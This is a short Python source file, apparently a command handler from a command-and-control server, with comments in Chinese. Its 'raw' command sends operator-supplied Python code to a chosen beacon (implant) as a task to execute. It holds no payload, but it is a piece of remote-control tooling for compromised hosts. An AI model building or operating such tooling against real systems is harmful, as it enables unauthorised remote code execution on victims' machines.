"""raw — 下发原始 Python 代码"""

from server.task_queue import Task


def run(disp, args):
    if not args:
        return "[!] usage: raw [beacon_id] <code>"
    bid, code_parts = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon"
    if not code_parts:
        return "[!] usage: raw [beacon_id] <code>"
    code = " ".join(code_parts)
    task = Task(code=code)
    return disp.push_task(bid, task)
